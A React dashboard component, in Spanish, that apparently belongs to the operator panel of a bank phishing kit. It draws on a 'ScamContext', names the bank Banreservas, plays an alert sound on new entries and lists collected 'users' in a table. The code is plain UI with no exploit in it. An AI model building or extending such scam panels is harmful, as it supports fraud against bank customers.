import React, { useContext } from 'react'
import ReactHowler from 'react-howler'
import { ScamContext } from '../../context/ScamContext';
import { SocketContext } from '../../context/SocketContext';
import { DownboxActions } from '../helpers/DownboxActions';
import { Layout } from '../Layout/Layout';
import { TableUserAll } from '../Tables/TableUserAll';
import { CheckBoxUtil } from '../utils/CheckBoxUtil';
import { DropdownUtil } from '../utils/DropdownUtil';

export const Dashboard = () => {
    
    const {
        selected, 
        users, 
        notification, 
        setNotification,
    } = useContext(ScamContext);
    
    const { online } = useContext( SocketContext );


    return (
        <Layout>
            <div className='border-b-2 pb-3 flex justify-between items-center'>
                <p className='text-3xl'>{ online ? selected : 'Servidor caido'}</p>
                <p className={online ? 'bg-green-500 px-3 rounded text-white' : 'bg-red-500 px-3 rounded text-white' }>servidor</p>
            </div>
            <div className='flex flex-col sm:flex-row justify-between items-center mt-10 mb-5 bg-white p-5 rounded shadow gap-5'>
                <div className='flex flex-col md:flex-row items-center md:items-end gap-4'>
                <DownboxActions />
                {
                    users[0]?.name === 'banreservas' ? null : <CheckBoxUtil /> 
                }
                
                </div>
                {
                notification === true ?
                (
                    <>
                    <ReactHowler
                        src='https://assets.mixkit.co/sfx/preview/mixkit-gaming-lock-2848.mp3'
                        playing={true}
                        onEnd={() => setNotification(false)}
                    />
                    </>
                ) : null
                }
                
                <DropdownUtil />

            </div>
            <div className='bg-white rounded shadow p-5'>

                {
                users.length === 0 || users === undefined || online === false
                ? <p className='p-5 text-gray-500'>No hay datos disponible</p>
                : <TableUserAll users={users} />
                }
                
            </div>
        </Layout>
    )
}


